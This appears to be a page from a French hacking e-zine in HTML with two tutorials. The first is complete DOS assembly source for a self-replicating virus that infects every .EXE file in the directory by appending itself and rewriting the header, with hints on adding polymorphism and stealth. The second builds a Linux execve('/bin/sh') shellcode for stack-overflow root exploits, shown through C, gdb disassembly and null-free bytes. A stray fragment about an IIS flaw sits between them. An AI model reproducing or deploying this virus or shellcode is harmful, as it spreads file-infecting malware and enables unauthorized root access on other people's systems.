        mov  ah,3f                           ;ah &lt;- 3fh<br>
        mov  cx,1a                           ;cx &lt;- 1ah (taille du fichier)<br>
        lea  dx,[bp+header_exe]              ;dx &lt;- [bp+header_exe]&nbsp;<br>
        int  21                              ;on stocke le contenu du fichier dans le buffer header_exe<br>
        cmp  word ptr [bp+header_exe],'ZM'   ;fichier exe?<br>
        jne  close_file                      ;non on ferme le fichier&nbsp;<br>
        cmp  byte ptr [bp+header_exe+12],'X' ;fichier déjà infecté?<br>
        je   close_file                      ;oui on ferme le fichier&nbsp;<br>
        call __SHEADER                       ;on appelle la routine SHEADER<br>
        mov  ax,4202                         ;on se déplace au début du fichier&nbsp;<br>
        xor  cx,cx&nbsp;<br>
        xor  dx,dx&nbsp;<br>
        int  21&nbsp;<br>
        push ax dx                           ;empilement de ax et dx<br>
        call __CSIP                          ;appel de la routine CSIP&nbsp;<br>
        pop  dx ax                           ;dx &lt;- dx, ax &lt;- ax (taille du fichier non infecté)&nbsp;<br>
        call  __SIZE                         ;appel de la routine SIZE&nbsp;<br>
        mov  ah,40                           ;ax &lt;- 40h&nbsp;<br>
        mov  cx,Fin-Virus                    ;cx &lt;- offset Fin - offset virus (taille du virus)&nbsp;<br>
        lea  dx,[bp+Virus]                   ;dx &lt;- [bp+Virus]&nbsp;<br>
        int  21                              ;on écrit le virus à la fin du fichier<br>
        mov  ax,4200                         ;déplacement au début du fichier&nbsp;<br>
        xor  cx,cx&nbsp;<br>
        xor  dx,dx<br>
        int  21<br>
        mov  ah,40&nbsp;<br>
        mov  cx,1a&nbsp;<br>
        lea  dx,[bp+header_exe]<br>
        int  21                              ;écriture de l'header modifié<br>
<br>
<br>
<br>
L'infection du fichier exe actuellement ouvert terminée, il nous faut le refermet et continuer la recherche. En cas d'erreur, ou de fin de recherche, on saute directement au label End_loop, qui restore la table DTA d'origine.<br>
<br>
<br>
Close_File:&nbsp;<br>
        mov  ah,3e           ;ah &lt;- 3eh (bx &lt;- handle)<br>
        int  21              ;fermeture du fichier<br>
<br>
Continue:&nbsp;<br>
        mov  ah,4f           ;ah &lt;- 4fh<br>
        jmp  Loop_cherche    ;continuer recherche<br>
<br>
End_loop:&nbsp;<br>
        pop  ds              ;adresse du segment PSP<br>
        mov  dx,80           ;dx &lt;- 80<br>
        mov  ah,1a           ;ah &lt;- 1ah<br>
        int  21              ;restoration de la table DTA<br>
<br>
<br>
La recherche terminée, le segment de code doit être remodifié de façon à éxécuter le code original du fichier hôte. Nous effectuons ensuite un far jump 0 New_CS:New_IP (ce qui à pour conséquence de rendre la main au fichier infecté).<br>
<br>
<br>
Hote_go:<br>
        push ds&nbsp;<br>
        pop  es                          ;es &lt;- ds<br>
        mov  ax,es                       ;ax &lt;- es<br>
        add  ax,10&nbsp;<br>
        add  word ptr cs:[bp+New_CS],ax  ;reajuste l'ancien segment de code (sauvegardé avant infection)<br>
        cli&nbsp;<br>
        add  ax,word ptr cs:[bp+New_SS]  ;reajuste l'ancien segment de pile (sauvegardé avant infection)<br>
        mov  ss,ax                       ;ss &lt;- ax&nbsp;<br>
        mov  sp,word ptr cs:[bp+New_SP]  ;on restore le pointeur de pile original<br>
        sti<br>
<br>
        db      0ea                      ;far jmp New_CS:New_IP<br>
New_CS  dw      0<br>
New_IP  dw      0<br>
New_SP  dw      0<br>
New_SS  dw      0<br>
<br>
<br>
Def_CS  dw      0fff0&nbsp;<br>
Def_IP  dw      0&nbsp;<br>
Def_SP  dw      0&nbsp;<br>
Def_SS  dw      0fff0&nbsp;<br>
<br>
<br>
Bon à présent étudions les différentes routines qui vont nous permettre l'éxécution du virus à l'ouverture du fichier hôte dans de bonnes conditions. Pour commencer la routine CSIP. Celle-ci s'occupe de la modification des différents offsets de l'header du fichier a infecter. Les offsets 0Eh, 10h, 12h, 14h et 16h sont modifiés respectivement avec l'offset du nouveau segment de pile calculé en paragraphes (SS=CS), la valeur 0FFFE (SP), 'X' caractère marqueur de l'infection (placé dans le Negative checksum offset 12h), puis, la nouvelle première instruction à éxécuter (la première de notre virus) et enfin l'adresse de segment CS modifiée. Toutes ces valeurs sont calculées en effectuant différents calculs obtenus par manipulation des mnémoniques arithmétiques (shl,shr) qui effectuent un décalage&nbsp;<br>
à droite ou à gauche de n octets, ce qui a pour résultat de multiplier la valeur placée dans l'opérande source par une puissance de 2, correspondant au nombre placé dans l'opérande de destination.&nbsp;<br>
<br>
<br>
__CSIP:<br>
        push ax                                 ;empile (ax &lt;- taille du fichier hôte)<br>
        mov  ax,word ptr[bp+header_exe+8]       ;ax &lt;- taille de l'header<br>
        mov  cl,4                               ;cl &lt;- 4 (2^4=32)<br>
        shl  ax,cl                              ;conversion en bytes (ax*32)<br>
        mov  cx,ax                              ;cx &lt;- ax<br>
        pop  ax                                 ;ax &lt;- taille du fichier hôte<br>
        sub  ax,cx                              ;ax &lt;- ax - cx<br>
        sbb  dx,0&nbsp;<br>
        mov  cl,0ch                             ;cx &lt;- 12&nbsp;<br>
        shl  dx,cl                              ;dx &lt;- adresse de segment<br>
        mov  cl,4                               ;cl &lt;- 4<br>
        push ax&nbsp;<br>
        shr  ax,cl                              ;ax &lt;- ax/4<br>
        add  dx,ax                              ;dx &lt;- dx + ax (nouveau CS)<br>
        shl  ax,cl                              ;ax &lt;- ax*4&nbsp;<br>
        pop  cx&nbsp;<br>
        sub  cx,ax                              ;cx &lt;- cx - ax (nouveau IP)<br>
        mov  word ptr [bp+header_exe+0Eh],dx    ;[bp+header_exe+0Eh] &lt;- nouveau SS (= CS)<br>
        mov  word ptr [bp+header_exe+10],0FFFE  ;[bp+header_exe+10] &lt;- 0FFFE (SP)<br>
        mov  byte ptr [bp+header_exe+12],'X'    ;[bp+header_exe+12] &lt;- 'X' (marqueur d'infection)<br>
        mov  word ptr [bp+header_exe+14],cx     ;[bp+header_exe+14] &lt;- nouveau IP<br>
        mov  word ptr [bp+header_exe+16],dx     ;[bp+header_exe+16] &lt;- nouveau CS<br>
        ret<br>
<br>
 La routine SIZE calcule la nouvelle taille du fichier hôte infecté (fichier hôte et virus concaténés), en pages et en bytes, puis place à l'offset 04 du PE header le nombre de pages, et à l'offset 02 la taille en byte du fichier hôte infecté.&nbsp;<br>
<br>
__SIZE:<br>
        push ax                                ;empilem (ax &lt;- taille fichier hôte)<br>
        add  ax,Fin - Virus                    ;ax &lt;- taille fichier infecté<br>
        adc  dx,0&nbsp;<br>
        mov  cl,7                              ;cl &lt;- 7 (2^7=128)<br>
        shl  dx,cl                             ;dx &lt;- dx*128<br>
        mov  cl,9                              ;cl &lt;- 9 (2^9=512)<br>
        shr  ax,cl                             ;ax &lt;- ax/512<br>
        add  ax,dx                             ;ax &lt;- ax + dx<br>
        inc  ax&nbsp;<br>
        mov  word ptr [bp+header_exe+04],ax    ;[bp+header_exe+04] &lt;- nombre de pages<br>
        pop  ax<br>
        mov  dx,ax<br>
        shr  ax,cl<br>
        shl  ax,cl<br>
        mov  dx,ax<br>
        mov  word ptr [bp+header_exe+02],dx    ;[bp+header_exe+02] &lt;- taille en bytes<br>
        ret<br>
<br>
<br>
<br>
<br>
Et enfin la routine SHEADER qui effectue une sauvegarde de l'header du fichier hôte non infecté par copie des champs de celui-la allant être modifié (0Eh-SS, 10-SP, 14-IP, 16-CS), dans les buffers respectifs Def_SS, Def_SP, Def_IP, Def_CS.<br>
<br>
__SHEADER:<br>
        mov  ax,word ptr [bp+header_exe+0Eh]<br>
  	mov  word ptr [bp+Def_SS],ax           ;[bp+Def_SS] &lt;- [bp+header_exe+0Eh]<br>
        mov  ax,word ptr [bp+header_exe+10]<br>
  	mov  word ptr [bp+Def_SP],ax           ;[bp+Def_SP] &lt;- [bp+header_exe+12]<br>
        mov  ax,word ptr [bp+header_exe+14]<br>
  	mov  word ptr [bp+Def_IP],ax           ;[bp+Def_IP] &lt;- [bp+header_exe+14]<br>
        mov  ax,word ptr [bp+header_exe+16]<br>
  	mov  word ptr [bp+Def_CS],ax           ;[bp+Def_CS] &lt;- [bp+header_exe+16]<br>
        ret<br>
<br>
<br>
<br>
    III. Code source :<br>
-------------------------<br>
<br>
.model tiny<br>
.radix 16&nbsp;<br>
.code<br>
<br>
        org 100<br>
<br>
Virus:<br>
        push ds&nbsp;<br>
        push cs cs&nbsp;<br>
        pop  es ds&nbsp;<br>
        call debut&nbsp;<br>
<br>
debut:&nbsp;<br>
        pop  bp&nbsp;<br>
        sub  bp,offset debut&nbsp;<br>
<br>
MDTA:<br>
        lea  dx,[bp+DTA]&nbsp;<br>
        mov  ah,1a&nbsp;<br>
        int  21&nbsp;<br>
<br>
Defaut:&nbsp;<br>
        lea  di,[bp+New_IP]&nbsp;<br>
        lea  si,[bp+Def_IP]<br>
        mov  cx,4<br>
        rep  movsw&nbsp;<br>
        mov  ah,4e<br>
        xor  cx,cx&nbsp;<br>
        lea  dx,[bp+exesig]&nbsp;<br>
<br>
Loop_cherche:<br>
        int  21<br>
        jc   End_loop<br>
        mov  ax,3d02<br>
        lea  dx,[bp+DTA+1e]&nbsp;<br>
        int  21&nbsp;<br>
        mov  bx,ax&nbsp;<br>
        mov  ah,3f<br>
        mov  cx,1a<br>
        lea  dx,[bp+header_exe]&nbsp;<br>
        int  21<br>
        cmp  word ptr [bp+header_exe],'ZM'&nbsp;<br>
        jne  close_file&nbsp;<br>
        cmp  byte ptr [bp+header_exe+12],'X'&nbsp;<br>
        je   close_file&nbsp;<br>
        call __SHEADER<br>
        mov  ax,4202&nbsp;<br>
        xor  cx,cx&nbsp;<br>
        xor  dx,dx&nbsp;<br>
        int  21&nbsp;<br>
        push ax dx<br>
        call __CSIP&nbsp;<br>
        pop  dx ax&nbsp;<br>
        call  __SIZE&nbsp;<br>
        mov  ah,40&nbsp;<br>
        mov  cx,Fin-Virus&nbsp;<br>
        lea  dx,[bp+Virus]<br>
        int  21<br>
        mov  ax,4200&nbsp;<br>
        xor  cx,cx&nbsp;<br>
        xor  dx,dx<br>
        int  21<br>
        mov  ah,40&nbsp;<br>
        mov  cx,1a&nbsp;<br>
        lea  dx,[bp+header_exe]<br>
        int  21<br>
<br>
Close_File:&nbsp;<br>
        mov  ah,3e<br>
        int  21&nbsp;<br>
<br>
Continue:&nbsp;<br>
        mov  ah,4f<br>
        jmp  Loop_cherche<br>
<br>
End_loop:&nbsp;<br>
        pop  ds&nbsp;<br>
        mov  dx,80<br>
        mov  ah,1a<br>
        int  21<br>
<br>
Hote_go:<br>
        push ds&nbsp;<br>
        pop  es<br>
        mov  ax,es<br>
        add  ax,10&nbsp;<br>
        add  word ptr cs:[bp+New_CS],ax&nbsp;<br>
        cli<br>
        add  ax,word ptr cs:[bp+New_SS]&nbsp;<br>
        mov  ss,ax&nbsp;<br>
        mov  sp,word ptr cs:[bp+New_SP]&nbsp;<br>
        sti<br>
<br>
        db      0ea&nbsp;<br>
New_CS  dw      0<br>
New_IP  dw      0<br>
New_SP  dw      0<br>
New_SS  dw      0<br>
<br>
<br>
Def_CS  dw      0fff0&nbsp;<br>
Def_IP  dw      0&nbsp;<br>
Def_SP  dw      0&nbsp;<br>
Def_SS  dw      0fff0&nbsp;<br>
<br>
__CSIP:<br>
        push ax<br>
        mov  ax,word ptr[bp+header_exe+8]<br>
        mov  cl,4<br>
        shl  ax,cl<br>
        mov  cx,ax<br>
        pop  ax<br>
        sub  ax,cx<br>
        sbb  dx,0<br>
        mov  cl,0ch<br>
        shl  dx,cl<br>
        mov  cl,4<br>
        push ax<br>
        shr  ax,cl<br>
        add  dx,ax<br>
        shl  ax,cl<br>
        pop  cx<br>
        sub  cx,ax<br>
        mov  word ptr [bp+header_exe+0Eh],dx<br>
        mov  word ptr [bp+header_exe+10],0FFFE<br>
        mov  byte ptr [bp+header_exe+12],'X'<br>
        mov  word ptr [bp+header_exe+14],cx<br>
        mov  word ptr [bp+header_exe+16],dx<br>
        ret<br>
<br>
__SIZE:<br>
        push ax<br>
        add  ax,Fin - Virus<br>
        adc  dx,0<br>
        mov  cl,7<br>
        shl  dx,cl<br>
        mov  cl,9<br>
        shr  ax,cl<br>
        add  ax,dx<br>
        inc  ax<br>
        mov  word ptr [bp+header_exe+04],ax<br>
        pop  ax<br>
        mov  dx,ax<br>
        shr  ax,cl<br>
        shl  ax,cl<br>
        mov  dx,ax<br>
        mov  word ptr [bp+header_exe+02],dx<br>
        ret<br>
<br>
__SHEADER:<br>
        mov  ax,word ptr [bp+header_exe+0Eh]<br>
  	mov  word ptr [bp+Def_SS],ax<br>
        mov  ax,word ptr [bp+header_exe+10]<br>
  	mov  word ptr [bp+Def_SP],ax<br>
        mov  ax,word ptr [bp+header_exe+14]<br>
  	mov  word ptr [bp+Def_IP],ax<br>
        mov  ax,word ptr [bp+header_exe+16]<br>
  	mov  word ptr [bp+Def_CS],ax<br>
        ret<br>
<br>
<br>
exesig       db     '*.EXE',0&nbsp;<br>
Fin:<br>
<br>
header_exe   db      1a dup (?)<br>
DTA:<br>
End Virus<br>
<br>
<br>
    V. Conclusion :<br>
-----------------------<br>
<br>
<br>
L'infection d'un .exe se montre ainsi plus difficile que celle d'un .com. Mais, Le format exe étant un poil moins complexe que le format elf, les virus ont encore de beaux jours devant eux sur les plate-formes windows. Le code de ce virus peut être une fois encore largment optimisé pour se voir greffer un moteur de polymorphie par exemple ou encore une routine de restoration de date de modification des fichiers infectés, en conséquence, la furtivité du virus s'en verra grandement améliorée.<br>
<BR></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><IMG BORDER=0 height=636 
SRC="La%20faille%20Unicode%20IIS/1.jpg" width=627></FONT></P><P ALIGN=left><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Le 
répertoire du site est par défaut : <B>C:\IntePub\wwwroot<BR></B></FONT></P><P><BR></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>4 . 
</FONT><font face="Verdana, Arial, Helvetica, sans-serif" size="2">HACKING :&nbsp;
LES SHELLCODES / OBTENTION DES DROITS DE ROOT- Nocte</font><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>===================================================================== 
</FONT></P><P><br>
   Un hacker est comparable à une personne placé à l'entrée des portes d'une très grosse entreprises, guettant l'apparition d'une
brèche dans son système de sécurité afin de s'y infiltrer. Il réussit à gagner des privilèges, par exemple, via la création d'exploit. Qu'est-ce qu'un exploit ? S0RC3Ry, du défunt groupe phe et auteur de Noroute, définit ce terme dans la première issue de cet e-zine mythique : "L'exploit est un petit programme ou un
série de commande trouvées par un ingénieux bonhomme qui permet souvent de chopper l'accès root sur un système". (on distingue les exploits locaux, un user cherchant à devenir root, et les exploits remote, un user obtenant un compte sur une machine via une faille de serveur entre autres).<br>
   Un hacker tentera, pour cela, d'agir sur le contenu de la stack afin d'écraser l'adresse de retour d'une fonction (stack overflow) et de faire exécuter à l'application un code arbitraire via un shellcode. Tout devient intéressant si l'application en questions possède le bit setuid ou si c'est un démon. Notre hacker va donc programmer un morceau de code capable de lancer un shell, suivi peut être d'autres actions (modifications des permissions du fichier etc/passwd...). Ce programme, petit et en assembleur, capable de lancer un shell est appelé shellcode et, par extension, capable de lancer toute commande de shell (en effet, par des méthodes sophistiqué d'éthymologie araméno-hébraïquo roumaine, on s'aperçoit que ce mot est formé de "shell" et code, d'où : code de shell ;). Ainsi, si on programme un shellcode qui fera lancer un shell à une application ayant les privilèges de root, le shell - donc le hacker - aura les droits de root, selon le principe de l'endossement (qui dit qu'une application est lancé avec les droits de celui qui l'appelle, voir mon tutorial "privilège sous unix"). Assez parler,
passons à la programmation de notre shellcode.<br>
<br>
I. PROGRAMMATION DU SHELLCODE<br>
----------------------------------------------<br>
<br>
Rappelons-nous que la fonction principale d'un shellcode est d'exécuter un shell. Ce programme est donc un shellcode :<br>
<br>
    #include &lt;stdio.h><br>
    #include &lt;unistd.h><br>
<br>
int main()<br>
{<br>
  char * name[] = {"/bin/sh", NULL};<br>
  execve(name[0], name, NULL);<br>
  return (0);<br>
}<br>
<br>
Première controverse : plusieurs fonctions peuvent appeler un shell. Pourquoi utiliser execve ? Eh bien, cette fonction est un syscall (appel-système), contrairement aux autres exec(). Or, rappelez-vous qu'un shellcode est programmé en assembleur. Par conséquent, il ne faut utiliser que des syscalls, car un appel-système s'effectue directement par une interruption. Cela nous permettra d'avoir un code efficace et court puisqu'on aura qu'à déterminer les registes impliqués et leur contenu.<br>
Pour le moment, tout semble parfait, mais non. Rappelons que notre code est inséré au beau milieu de l'application attaqué. Si execve () plante, le programme continue à la suite, ce qui peut avoir des conséquences très grave. On ne peut donc pas terminer par un return(0), car cette dernière commande ne permettra de quitter le programme que si elle est appelé depuis main(), ce qui est très peu probable ici. Il faut forcer la sortie via _exit() (et pas exit() car cette fonction dérive du syscall _exit()).  :<br>
<br>
    #include &lt;stdio.h><br>
    #include &lt;unistd.h><br>
<br>
int main()<br>
{<br>
  char * name [] = {"/bin/sh", NULL};<br>
  execve (name [0], name, NULL);<br>
  _exit (0);<br>
}<br>
<br>
En réalité, exit() est encore une fonction de bibliothèque qui encadre le véritable appel-système nommé _exit(). Une nouvelle modification nous rapproche encore plus du système :&nbsp;<br>
<br>
   A présent, il nous faut analyser ce programme dans son équivalent en assembleur. Compilons notre programme :<br>
$ gcc -o shellcode shellcode.c -O2 -g --static (--static intègre les fonctions qui se trouvent d'ordinaire dans les bibliothèques partagées).<br>
$ gdb shellcode<br>
(gdb) disassemble main (on lui demande le listing assembleur de main())<br>
<br>
Dump of assembler code for function main:<br>
0x8048168 &lt;main>:       push   %ebp<br>
0x8048169 &lt;main+1>:     mov    %esp,%ebp<br>
0x804816b &lt;main+3>:     sub    $0x8,%esp<br>
0x804816e &lt;main+6>:     movl   $0x0,0xfffffff8(%ebp)<br>
0x8048175 &lt;main+13>:    movl   $0x0,0xfffffffc(%ebp)<br>
0x804817c &lt;main+20>:    mov    $0x8071ea8,%edx<br>
0x8048181 &lt;main+25>:    mov    %edx,0xfffffff8(%ebp)<br>
0x8048184 &lt;main+28>:    push   $0x0<br>
0x8048186 &lt;main+30>:    lea    0xfffffff8(%ebp),%eax<br>
0x8048189 &lt;main+33>:    push   %eax<br>
0x804818a &lt;main+34>:    push   %edx<br>
0x804818b &lt;main+35>:    call   0x804d9ac => _execve<br>
0x8048190 &lt;main+40>:    push   $0x0<br>
0x8048192 &lt;main+42>:    call   0x804d990 => _exit<br>
0x8048197 &lt;main+47>:    nop<br>
End of assembler dump.<br>
(gdb)<br>
<br>
On devrait noter tout de suite qu'en 0x804817c, en met dans %edx 0x8071ea8, qui ressemble à une adresse. Si on examine le contenu mémoire à cette adresse on s'aperçoit qu'il s'agit de notre chaîne :<br>
(gdb) printf "%s\n", 0x8071ea8<br>
/bin/sh<br>
(gdb)<br>
<br>
Bon, on regarde le désassemblage de _execve :<br>
<br>
(gdb) disassemble __execve<br>
Dump of assembler code for function __execve:<br>
0x804d9ac &lt;__execve>:    push   %ebp<br>
0x804d9ad &lt;__execve+1>:  mov    %esp,%ebp<br>
0x804d9af &lt;__execve+3>:  push   %edi<br>
0x804d9b0 &lt;__execve+4>:  push   %ebx<br>
0x804d9b1 &lt;__execve+5>:  mov    0x8(%ebp),%edi<br>
0x804d9b4 &lt;__execve+8>:  mov    $0x0,%eax<br>
0x804d9b9 &lt;__execve+13>: test   %eax,%eax<br>
0x804d9bb &lt;__execve+15>: je     0x804d9c2<br>
0x804d9bd &lt;__execve+17>: call   0x0<br>
0x804d9c2 &lt;__execve+22>: mov    0xc(%ebp),%ecx<br>
0x804d9c5 &lt;__execve+25>: mov    0x10(%ebp),%edx<br>
0x804d9c8 &lt;__execve+28>: push   %ebx<br>
0x804d9c9 &lt;__execve+29>: mov    %edi,%ebx<br>
0x804d9cb &lt;__execve+31>: mov    $0xb,%eax<br>
0x804d9d0 &lt;__execve+36>: int    $0x80<br>
0x804d9d2 &lt;__execve+38>: pop    %ebx<br>
0x804d9d3 &lt;__execve+39>: mov    %eax,%ebx<br>
0x804d9d5 &lt;__execve+41>: cmp    $0xfffff000,%ebx<br>
0x804d9db &lt;__execve+47>: jbe    0x804d9eb<br>
0x804d9dd &lt;__execve+49>: call   0x8048c84 => _errno_location<br>
0x804d9e2 &lt;__execve+54>: neg    %ebx<br>
0x804d9e4 &lt;__execve+56>: mov    %ebx,(%eax)<br>
0x804d9e6 &lt;__execve+58>: mov    $0xffffffff,%ebx<br>
0x804d9eb &lt;__execve+63>: mov    %ebx,%eax<br>
0x804d9ed &lt;__execve+65>: lea    0xfffffff8(%ebp),%esp<br>
0x804d9f0 &lt;__execve+68>: pop    %ebx<br>
0x804d9f1 &lt;__execve+69>: pop    %edi<br>
0x804d9f2 &lt;__execve+70>: leave<br>
0x804d9f3 &lt;__execve+71>: ret<br>
End of assembler dump.<br>
(gdb) disassemble _exit<br>
Dump of assembler code for function _exit:<br>
0x804d990 &lt;_exit>:      mov    %ebx,%edx<br>
0x804d992 &lt;_exit+2>:    mov    0x4(%esp,1),%ebx<br>
0x804d996 &lt;_exit+6>:    mov    $0x1,%eax<br>
0x804d99b &lt;_exit+11>:   int    $0x80<br>
0x804d99d &lt;_exit+13>:   mov    %edx,%ebx<br>
0x804d99f &lt;_exit+15>:   cmp    $0xfffff001,%eax<br>
0x804d9a4 &lt;_exit+20>:   jae    0x804dd90 => _syscall_error<br>
End of assembler dump.<br>
(gdb) quit<br>
<br>
En 0x804d9d0 pour execve() et en 0x804d99b pour _exit(), on passe la main au kernel pour qu'il gère les syscalls via l'interruption 0x80. Ce qui change dans les cas, c'est la valeur de %eax, qui contient le numéro correspondant au syscall : 0x0B pour execve() et 0x01 dans le cas de _exit()<br>
<br>
   En examinant plus précisemment le code de désassemblage de execve() et _exit(), on trouve les paramètres nécessaire :<br>
-> execve() réclame les paramètres suivants :&nbsp;<br>
* %ebx contient l'adresse de la chaîne de caractères "/bin/sh" ici (0x804d9b1 : mov 0x8(%ebp),%edi suivi de 0x804d9c9 : mov %edi,%ebx) ;&nbsp;<br>
* %ecx contient l'adresse de la table des arguments (0x804d9c2 : mov 0xc(%ebp),%ecx). Le premier argument doit être le nom du programme et nous n'en avons pas besoin d'autre, on le fait donc suivre du pointeur NULL nous conviendra ;&nbsp;<br>
* %edx contient l'adresse de la table représentant l'environnement du programme à lancer (0x804d9c5 : mov 0x10(%ebp),%edx). Pour rester simple, on prendra un pointeur NULL.&nbsp;<br>
<br>
-> _exit() termine le processus, et renvoie un code d'exécution à son appellant (le shell), contenu dans le registre %ebx. On aura donc besoin de la chaîne "/bin/sh", d'un pointeur sur chaîne et d'un pointeur NULL (pour les arguments et l'environnement). Pour l'état des registres, on aura alors  %ebx qui pointera directement vers la chaîne, %ecx vers la table complète, et %edx vers le second élément de la table (NULL).<br>
Eh bien, ce n'est pas si compliqué que cela ;)<br>
<br>
***LOCALISATION DU SHELLCODE***<br>
<br>
   Comme un shellcode est introduit dans un programme vulnérable via une variable, une chaîne ou un argument d'une commande, son adresse en mémoire est inconnue. Or, il nous la faut  pour connaître l'adresse de "/bin/sh". On a deux solutions.&nbsp;<br>
1) Elle est simple mais n'est pratique que pour les chaîne petites. Le principe est de pusher la chaîne sur la stack et récupérer l'adresse de %esp (le stack-pointer). Donc, on push 14 octets sur la stack par mot de 4 octets (c'est obligatoire).
Évidemment, on doit modifier notre chaîne pour qu'elle soit un multiple de 4, donc on pushera en fait la chaîne : "/bin//sh" (car sinon elle ne fait que 7 octets). On passe en hexadécimal chaque caractère et on les
push à l'envers, sans oublier de commencer par pusher 0 pour que la chaîne se termine bien par un "\0". On pushera donc d'abord "hs//" (c'est du verlan, eh ouais ;) puis "nib/".
Évidemment, on commence apr pusher "\0" (caractère de fin de chaîne) :<br>
xorl %eax, %eax (on met à 0)<br>
pushl %eax (on pushe un caractère null sur la stack)<br>
pushl 0x68732F2F (vous aurez compris que x68 = h, x73 = s...)<br>
pushl 0x6E69622F<br>
<br>
2) On utilise une astuce, très bien détaillé dans un article de Pr1on pour Phrack. Lors d'un call, le processeur
push l'adresse de retour (celle de la prochaine instruction à exécuter). Normalement, l'étape suivante est de sauvegarder l'état de la pile (en particulier le registre %ebp par l'instruction push %ebp). Pour récupérer, dès le call, l'adresse de retour, il suffit de dépiler avec l'instruction pop. Bien entendu, immédiatement après le call, on pushera
notre chaîne "/bin/sh". On procédera donc de la sorte :<br>
<br>
début_du_shellcode:<br>
    jmp appel_sous_routine<br>
<br>
sous_routine: (soit execve() qui donne la main au shell, soit _exit())<br>
    popl %esi (%esi fournit l'adresse de "/bin/sh"<br>
    ...<br>
    (Shellcode proprement dit)<br>
    ...<br>
appel_sous_routine:<br>
    call sous_routine<br>
    /bin/sh<br>
<br>
Il n'y a plus qu'à construire la table en la situant juste après la chaîne elle-même : son premier élément (en %esi + 8, longueur de "/bin/sh\0") contient la valeur du registre %esi, et le second (en %esi + 12) une adresse nulle (32 bits). Le code pour récupérer l'adresse du shellcode sera alors :&nbsp;<br>
<br>
popl %esi<br>
movl %esi, 0x8(%esi)<br>
movl $0x00, 0xc(%esi)<br>
<br>
   On a maintenant tout pour programmer notre shellcode. Mais avant, il faut un peu de réflexion. Les fonctions vulnérables sont du genre strcpy() (traitement de chaîne) ; or, elle bloquent dès qu'elles trouvent un caractère nul. Ainsi, on doit les supprimer dans le code en les remplaçant par des équivalents, du style :<br>
<br>
movl $0x00, 0x0c(%esi) ==> xorl %eax, %eax<br>
  			   movl %eax, %0x0c(%esi)<br>
<br>
Ici, c'est simple. Mais parfois, c'est en traduisant un hexa qu'on tombe sur un NULL. Par exemple, en 0x804d996 : mov $0x1,%eax, %eax vaut 1 pour différencier le syscall _exit(0) des autres. Converti en hexadécimal, cela donne :<br>
b8 01 00 00 00          mov    $0x1,%eax<br>
<br>
  L'idée est donc, en l'occurrence, d'initialiser %eax (par registre qui vaut 0) puis de l'incrémenter.<br>
<br>
  On peut aussi, par sécurité, rajouter manuelle l'octet nul de fin de chaîne avec :<br>
<br>
    movb %eax, 0x07(%esi) (movb ne travaille que sur un octet => on remplace %eax par %al)<br>
<br>
<br>
<br>
II. CONSTRUCTION DU SHELLCODE PROPREMENT DIT<br>
-------------------------------------------------------------------<br>
<br>
  Maintenant, nous n'avons plu besoin de rien. Réécrivons shellcode.c avec son code
assembleur, qu'on traduira ensuite en hexadécimal :<br>
<br>
int main()<br>
{<br>
  asm("jmp appel_sous_routine<br>
<br>
sous_routine:<br>
        popl %esi // on récupère l'adresse de la chaîne<br>
        movl %esi,0x8(%esi) // on l'écrit en première position dans la table<br>
        xorl %eax,%eax // puis on écrit le nul<br>
        movl %eax,0xc(%esi)<br>
        movb %eax,0x7(%esi) // on place \0 en fin de chaîne<br>
        movb $0xb,%al // execve()<br>
        movl %esi, %ebx // la chaîne se retrouve dans %ebx<br>
        leal 0x8(%esi),%ecx // %ecx contient la table arguments<br>
        leal 0xc(%esi),%edx // %edx contient la table environnement<br>
        int  $0x80 // syscall<br>
        xorl %ebx,%ebx // code de retour nul<br>
	movl %ebx,%eax // %eax = 1<br>
        inc  %eax<br>
        int  $0x80 // on passe la main au kernel qui gère le syscall<br>
<br>
appel_sous_routine:<br>
        call sous_routine<br>
        .string \"/bin/sh\"<br>
      ");<br>
}<br>
<br>
On compile :&nbsp;<br>
gcc -o shellcode shellcode.c" puis&nbsp;<br>
objdump --disassemble shellcode permet de s'assurer qu'il n'y a plus d'octets nul :<br>
<br>
08048398 &lt;main>:<br>
 8048398:	55                   	pushl  %ebp<br>
 8048399:	89 e5                	movl   %esp,%ebp<br>
 804839b:	eb 1f                	jmp    80483bc<br>
<br>
0804839d &lt;sous_routine>:<br>
 804839d:	5e                   	popl   %esi<br>
 804839e:	89 76 08             	movl   %esi,0x8(%esi)<br>
 80483a1:	31 c0                	xorl   %eax,%eax<br>
 80483a3:	89 46 0c             	movb   %eax,0xc(%esi)<br>
 80483a6:	88 46 07             	movb   %al,0x7(%esi)<br>
 80483a9:	b0 0b                	movb   $0xb,%al<br>
 80483ab:	89 f3                	movl   %esi,%ebx<br>
 80483ad:	8d 4e 08             	leal   0x8(%esi),%ecx<br>
 80483b0:	8d 56 0c             	leal   0xc(%esi),%edx<br>
 80483b3:	cd 80                	int    $0x80<br>
 80483b5:	31 db                	xorl   %ebx,%ebx<br>
 80483b7:	89 d8                	movl   %ebx,%eax<br>
 80483b9:	40                   	incl   %eax<br>
 80483ba:	cd 80                	int    $0x80<br>
<br>
080483bc &lt;appel_sous_routine>:<br>
 80483bc:	e8 dc ff ff ff       	call   804839d //sous_routine<br>
 80483c1:	2f                   	das<br>
 80483c2:	62 69 6e             	boundl 0x6e(%ecx),%ebp<br>
 80483c5:	2f                   	das<br>
 80483c6:	73 68                	jae    8048430<br>
 80483c8:	00 c9                	addb   %cl,%cl<br>
 80483ca:	c3                   	ret<br>
 80483cb:	90                   	nop<br>
 80483cc:	90                   	nop<br>
 80483cd:	90                   	nop<br>
 80483ce:	90                   	nop<br>
 80483cf:	90                   	nop<br>
<br>
A partir de 80483c1, les données sont les caractères de "/bin/sh" et des octets "aléatoires". Le code est bien exempt de zéro, excepté le caractère nul de fin de chaîne en 80483c8, que le programme réécrira de toute manière.  Tout à l'air de fonctionner. Cependant, si on teste le shellcode, on obtient un segfault :<br>
<br>
$ ./shellcode<br>
Segmentation fault (core dumped)<br>
$<br>
<br>
On notera vite que la zone de mémoire où la fonction main() se situe est en lecture seule. Les modifications que notre shellcode y apporte sont donc interdites... aïe!<br>
